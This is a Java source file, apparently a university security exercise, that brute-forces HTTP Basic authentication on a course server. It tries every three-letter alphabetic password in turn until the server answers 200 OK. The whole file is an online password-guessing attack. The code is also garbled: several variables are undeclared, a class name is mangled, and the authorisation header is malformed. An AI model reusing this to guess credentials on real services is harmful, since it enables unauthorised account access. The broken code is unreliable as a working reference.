
import java.net.*; 
import java.io.*; 
public class BruteForce {
private static String password="   "; 

   
  public static void main(String[] args) {
	   String Result=""; 
	  if (args.length<1)
			 {
			   System.out.println("Error:  Correct Format Filename, username e.g<>"); 
				System.exit(1);	
			 }
			 BruteForce bruteForce1 = new BruteForce();
			  Result=bruteForce1.Password("http://sec-crack.cs.rmit.edu./SEC/2/",args[0]); 
			  System.out.println("The Password of   "+args[0]+"is.."+Result);  
			  
		  }



 private String Password(String urlString,String username) 
 { 
 int cnt=0;
 
 t0 = System.currentTimeMillis();  
  for ( char ch = 'A';  ch <= 'z';  ch++ )
  { 
						 if (ch>'Z' && ch<'a')
						 { 
						   ch='a'; 
						 } 
				
				for ( char ch1 = 'A';  ch1 <= 'z';  ch1++ )
				 { 
					  
						if (ch1>'Z' && ch1<'a')
						 { 
						   ch1='a'; 
						 }


					 for ( char ch2 = 'A';  ch2 <= 'z';  ch2++ )
						 { 
							if (ch2>'Z' && ch2<'a')
						 { 
						   ch2='a'; 
						 }
							password=String.valueOf(ch)+String.valueOf(ch1)+String.valueOf(ch2);
								System.out.print("crackin...:"); 
					           	System.out.print("\b\b\b\b\b\b\b\b\b\b\b" ); 
						try
						{
					
				
				
				URL url = new URL (urlString);
				String userPassword=username+":"+password;  

       
		   String encoding = new url.misc.BASE64Encoder().encode (userPassword.getBytes());
			 URLConnection conc= url.openConnection();  
					   conc.setRequestProperty  ("Authorization", " " + encoding);			   
					   conc.connect();  
						cnt++;
					   if (conc.getHeaderField(0).trim().equalsIgnoreCase("HTTP/1.1 200 OK"))
						 {
							 t1 = System.currentTimeMillis();  
							 net=t1-t0;                                    
							System.out.println("The Number of Attempts "+cnt); 
							System.out.println("Total Time Taken in secs"+net/1000); 
							return password;  
						}
					
				}

		      	catch (Exception e )
				{
				  e.printStackTrace();   

				}

			
		     
		  
		  }
		  



         
                         
	    }  
        
  
	} 
        return "Password could not  found";  

 }


}